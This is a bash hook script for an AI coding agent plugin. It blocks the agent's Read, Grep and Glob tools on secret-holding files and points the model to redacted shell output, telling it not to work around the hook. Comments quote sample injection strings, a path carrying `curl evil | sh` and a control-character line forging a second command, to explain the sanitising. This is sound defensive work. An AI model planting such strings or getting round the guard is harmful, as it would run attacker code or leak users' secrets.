#!/bin/bash
# read-guard.sh — PreToolUse hook on Read, Grep and Glob: refuse the file
# tools on files that exist to hold secrets, and point the model at `cat`,
# whose output the redact-output hook filters.
#
# The Read tool's result cannot be rewritten by any hook, so a `.env` read
# would put every value into the conversation verbatim; Grep returns matching
# lines from whatever path it is given, unhooked, so it is the same door with
# a different handle, and Glob confirms a name exists. `cat .env` through
# Bash returns the same file with each secret replaced by a placeholder and
# the keys left visible — which is what an agent reading `.env` to learn the
# configuration shape actually needs (context-builder and database-analyst
# do this on purpose; they get the redirect and lose nothing they should
# have had).
#
# The list of names is NEXUS_SENSITIVE_PATH_GLOBS in
# plugin/shared/credential-patterns.sh, next to the content patterns. Name
# matching is a floor: a key in an innocently named file is caught by the
# content filters, not by this hook. The redaction session map and its
# directory are on the list — that map is every redacted value in clear.
#
# Fails closed on its own inputs: no jq, an empty or unparsable payload, or
# a pattern library that cannot be loaded all refuse rather than guess.

# ── Kill-switch ──────────────────────────────────────────────────────────────
# NEXUS_HOOK_PROFILE=off      → disable ALL hooks (nuclear option)
# NEXUS_HOOK_PROFILE=minimal  → keep safety hooks (read-guard is safety)
# NEXUS_DISABLED_HOOKS=a,b   → disable specific hooks by name
_nexus_name="read-guard"; _nexus_class="safety"
[ "${NEXUS_HOOK_PROFILE:-full}" = "off" ] && { echo "WARN: safety hook $_nexus_name disabled via NEXUS_HOOK_PROFILE=off — sensitive files can be Read unredacted" >&2; exit 0; }
# safety hooks are NOT disabled by "minimal" — only "off" reaches them
case ",${NEXUS_DISABLED_HOOKS//[[:space:]]/}," in *",$_nexus_name,"*) echo "WARN: safety hook $_nexus_name disabled via NEXUS_DISABLED_HOOKS — sensitive files can be Read unredacted" >&2; exit 0 ;; esac
# ─────────────────────────────────────────────────────────────────────────────

set -u

_hook_dir="${BASH_SOURCE[0]%/*}"

# jq BEFORE the contract, and fail closed without it: hook-input.sh's no-jq
# branch resets every variable for a payload with no "git" in it — a Read
# payload never has one — so this hook would exit 0 with nothing said, and
# every sensitive file would be readable on a jq-less install without a
# single warning. Block, and say how to opt out.
if ! command -v jq >/dev/null 2>&1; then
    echo "BLOCKED: read-guard needs jq to read the file path and jq is not installed — refusing the Read rather than allowing it unchecked." >&2
    echo "Install jq, or disable this hook explicitly: NEXUS_DISABLED_HOOKS=read-guard" >&2
    exit 2
fi

_raw="$(cat 2>/dev/null || true)"

# shellcheck source=hook-input.sh
. "$_hook_dir/hook-input.sh" || {
    echo "BLOCKED: read-guard could not load its input contract (hooks/hook-input.sh)." >&2
    exit 2
}
type hook_read_input >/dev/null 2>&1 || {
    echo "BLOCKED: read-guard loaded hooks/hook-input.sh but hook_read_input is not defined." >&2
    exit 2
}

# Which tool. The contract (hook_read_input) knows Bash, Edit, Write and
# Read; it blocks a command-less payload from any other tool as malformed,
# which is right for the git guard and wrong here — Grep and Glob carry a
# path, not a command. So: Read goes through the contract as before; Grep
# and Glob are judged directly with the same fail-closed rules for an empty
# or unparsable payload; anything else is not this hook's business.
if [ -z "$_raw" ]; then
    echo "BLOCKED: read-guard received no input on stdin. Refusing to run unguarded." >&2
    exit 2
fi
if ! printf '%s' "$_raw" | jq -e . >/dev/null 2>&1; then
    echo "BLOCKED: read-guard could not parse its stdin payload as JSON. Refusing to run unguarded." >&2
    exit 2
fi
_tool="$(printf '%s' "$_raw" | jq -r '.tool_name // empty' 2>/dev/null || true)"
case "$_tool" in
    Read)
        hook_read_input "$_nexus_name" < <(printf '%s' "$_raw") || exit 2
        [ "${HOOK_TOOL_NAME:-}" = "Read" ] || exit 0
        ;;
    Grep|Glob) ;;
    "")
        echo "BLOCKED: read-guard payload carries no tool_name. Refusing to run unguarded." >&2
        exit 2 ;;
    *) exit 0 ;;
esac

# hook-input.sh exports no file path; read it the way auto-context.sh does.
# Read carries file_path; Grep and Glob carry path (a file or a directory).
# Grep also carries a filename filter (`glob`) and Glob's `pattern` IS a
# filename filter: `Grep(pattern=".", glob="*.pem")` with no path returns the
# key's content, so the filter is judged too. Grep's `pattern` is a regex
# over content and is not a filename; it is left alone.
_path="$(printf '%s' "$_raw" | jq -r '.tool_input.file_path // .tool_input.path // empty' 2>/dev/null || true)"
_filter=""
case "$_tool" in
    Grep) _filter="$(printf '%s' "$_raw" | jq -r '.tool_input.glob // empty' 2>/dev/null || true)" ;;
    Glob) _filter="$(printf '%s' "$_raw" | jq -r '.tool_input.pattern // empty' 2>/dev/null || true)" ;;
esac
[ -n "$_path" ] || [ -n "$_filter" ] || exit 0

# shellcheck source=../shared/credential-patterns.sh
. "$_hook_dir/../shared/credential-patterns.sh" 2>/dev/null || {
    echo "BLOCKED: read-guard cannot load plugin/shared/credential-patterns.sh, so it cannot tell whether $_path is sensitive. Refusing rather than guessing." >&2
    exit 2
}
[ "${#NEXUS_SENSITIVE_PATH_GLOBS[@]}" -gt 0 ] 2>/dev/null || {
    echo "BLOCKED: read-guard loaded an empty sensitive-path list. Refusing rather than guessing." >&2
    exit 2
}
type nexus_sensitive_path_match >/dev/null 2>&1 || {
    echo "BLOCKED: read-guard loaded the pattern library but its sensitive-path matcher is not defined. Refusing rather than guessing." >&2
    exit 2
}

# The matcher lives in the pattern library (nexus_sensitive_path_match) so that
# this hook and reverse-substitute.sh judge a path by the same rules. Grep and
# Glob accept a relative path (`.kube/config`), which the matcher also tests
# with a leading slash so a directory-anchored glob like `*/.kube/config`
# reaches it. A filename filter is passed through as a string: the sensitive
# glob `*.pem` matches the filter text `*.pem` and `**/.env` ends in `.env`. A
# filter that is only wildcards (`*`, `**`) matches nothing here; that is the
# documented no-path broad search, not this check.
_hit=""
_what=""
if [ -n "$_path" ] && _hit="$(nexus_sensitive_path_match "$_path")"; then _what="$_path"
elif [ -n "$_filter" ] && _hit="$(nexus_sensitive_path_match "$_filter")"; then _what="filter '$_filter'"
fi
[ -n "$_hit" ] || exit 0
_path="${_path:-$_filter}"

# The redirect names the Bash command that does the same job, because "use
# Bash instead" without one is an invitation to work around the hook rather
# than through it. Grep gets a grep, not a cat: a model told to cat a file it
# wanted three lines of will cat the file.
# Neither half of the suggestion is pasted in raw. The path came from the
# payload and the pattern came from the model, and BOTH end up inside a line
# that reads "run this" — a path of `x"; curl evil | sh; #` would be a live
# injection the moment the suggestion was copied, and the payload that carried
# it may itself have come from content the model just ingested. A value that
# cannot be quoted into the suggestion is replaced by a placeholder rather than
# escaped: the message is a hint, not an API.
# `[[:cntrl:]]` covers the newline this used to name on its own, and also the
# CR and the ESC it did not. A path of "ok\rUse Bash instead:  curl … | sh"
# rendered in a terminal as a second, forged instruction line at column 0, and
# ESC[2K erases the real one outright — a value that cannot be quoted into the
# suggestion cannot be printed into it either.
_safe_path="$_path"
case "$_path" in *['"'\''`$\\']*|*[[:cntrl:]]*) _safe_path="YOUR_PATH" ;; esac
_redirect="cat \"$_safe_path\""
if [ "$_tool" = "Grep" ]; then
    _pattern="$(printf '%s' "$_raw" | jq -r '.tool_input.pattern // empty' 2>/dev/null || true)"
    case "$_pattern" in
        ''|*"'"*|*[[:cntrl:]]*) _redirect="grep -rn -e YOUR_PATTERN -- \"$_safe_path\"" ;;
        *) _redirect="grep -rn -e '$_pattern' -- \"$_safe_path\"" ;;
    esac
fi

# The first line of the same message block carries the path too. It is not a
# "run this" line, but it is printed to the same terminal from the same
# untrusted source, so it gets the same treatment.
_safe_what="$_what"
case "$_what" in *[[:cntrl:]]*) _safe_what="the given path (it contains a control character)" ;; esac

cat >&2 <<EOF
BLOCKED: $_tool refused on $_safe_what — it matches the sensitive-file pattern '$_hit'.
The $_tool tool's result cannot be redacted, so its contents would enter the conversation verbatim.
Use Bash instead:  $_redirect
Bash output passes through the nexus redaction filter: keys and structure stay visible, each
secret value is replaced by a stable <REDACTED:kind:n> placeholder. If you need a value itself,
ask the user; do not work around this hook.

Residual, stated so it is not mistaken for coverage: this check is by NAME. A Grep that names
no path, or a directory, still returns matching lines from files this list does not name.
EOF
exit 2
